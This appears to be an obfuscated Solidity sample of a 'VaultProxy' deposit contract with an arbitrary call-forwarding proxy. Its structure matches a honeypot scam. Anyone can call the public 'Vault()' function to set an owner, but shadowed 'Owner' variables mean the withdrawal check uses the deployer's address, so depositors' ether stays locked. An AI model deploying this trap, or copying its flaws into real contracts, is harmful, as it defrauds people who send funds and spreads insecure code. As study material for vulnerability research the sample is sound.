// SPDX-License-Identifier: MIT
pragma solidity ^0.4.23;

contract Proxy  {
    modifier _0x7517da { if (msg.sender == Owner) _; } address Owner = msg.sender;
    function _0x18beb8(address _0x0a65ba) public _0x7517da { Owner = _0x0a65ba; }
    function _0x2126b1(address _0x41d8d5, bytes data) public payable {
        _0x41d8d5.call.value(msg.value)(data);
    }
}

contract VaultProxy is Proxy {
    address public Owner;
    mapping (address => uint256) public Deposits;

    function () public payable { }

    function Vault() public payable {
        if (msg.sender == tx.origin) {
            Owner = msg.sender;
            _0x4ccc32();
        }
    }

    function _0x4ccc32() public payable {
        if (msg.value > 0.25 ether) {
            Deposits[msg.sender] += msg.value;
        }
    }

    function _0xd5aaed(uint256 _0x3cc0bf) public _0x7517da {
        if (_0x3cc0bf>0 && Deposits[msg.sender]>=_0x3cc0bf) {
            msg.sender.transfer(_0x3cc0bf);
        }
    }
}